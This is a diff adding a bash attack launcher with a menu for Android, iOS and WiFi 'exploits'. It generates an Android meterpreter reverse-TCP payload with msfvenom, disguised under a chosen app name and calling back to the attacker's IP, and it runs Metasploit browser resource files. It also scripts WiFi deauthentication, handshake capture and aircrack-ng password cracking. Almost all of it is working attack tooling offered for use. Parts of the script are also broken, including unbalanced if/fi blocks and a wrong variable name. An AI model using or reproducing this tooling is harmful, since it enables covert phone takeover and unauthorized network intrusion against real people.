@@ -1,0 +1,102 @@
+#!/bin/bash
+ipfile="ip_file.tmp"
+clear
+echo "88888888888                    8888"
+echo "88                               88"
+echo "88                               88"
+echo "88aaaaa ,adPPYba,  ,adPPYba, 88  88"
+echo "88      a8      8a  I8[      88  88"
+echo "88      8b      d8   Y8ba,   88  88"
+echo "88      8a,   ,a8  aa    ]8I 88  88"
+#10
+echo "88        YbbdP      YbbdP   88  8888"
+sleep 2
+echo 
+echo 
+echo 
+echo 
+echo "1. Android Exploits (first)"
+echo "2. Ios Exploits (second)"
+echo "3. Wifi hacking (third)"
+#20
+read f
+if [[ "$f" == 'first' || "$f" == '1'  ]];
+ then
+ echo --Android Exploits--
+ echo "1.Browser "
+ echo "2.App-exploit"
+ read s
+ fi
+ if [[ "$s" == 'app' || "$f" == '2' ]];
+#30
+ then
+  echo "enter your ip address:"
+  echo "need ip address? (local) (y/n) :"
+  read i
+  fi
+   if [[ "$i" == 'y' ]]; 
+      then 
+      sudo ifconfig
+      echo "ip address: "
+   else 
+      echo "no need for them ip addresses "
+      echo "ip address: "
+  fi
+  read ip
+  echo $ip >>ipfile
+  echo " app name:"
+  read name
+  echo "enter path :"
+#50 
+    msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=556 R> $name
+    msfconsole -r android.rc
+
+fi
+
+if [[ "$s" == 'browser' || "$s" == '1' ]]; 
+ then  
+msfconsole -r browser.rc
+
+#60
+if [[ "$f" == 'second' || "$f" == '2' ]];
+ then 
+ echo --Ios Exploits--
+ echo "1.Browser-based exploit "
+ echo "2.App-exploit (coming Soon)"
+read c
+if [[ "$c" == 'browser' ]];
+then
+msfconsole -r safari.rc
+#70
+fi
+fi
+if [[ "$f" == 'third' || "$f" == 'wifi' || "$f" == '3'  ]];
+ then
+ echo "--Wifi Exploit--"
+ sudo airmon-ng
+ echo "enter your desired card:"
+ read card
+ sudo airmon-ng start $card
+#80 
+ sudo airmon-ng stop $card
+ sudo airmon-ng check kill
+ echo "enter your card for airodump"
+ read ncard
+ sudo airodump-ng $ncard
+ echo name
+ read name
+ echo chanel
+ read chanel
+#90 
+ echo mac 
+ read mac
+ sudo airodump-ng -w $name -c $chanel --bssid $mac $ncard
+ read station 
+ sudo aireplay-ng --deauth 10 -a $mac -c $station $ncard
+ echo "wordlist path:"
+ read word
+ echo "cap file path:"
+ read cap 
+#100 
+ sudo aircrack-ng -w $word -b $mac $cap
+fi
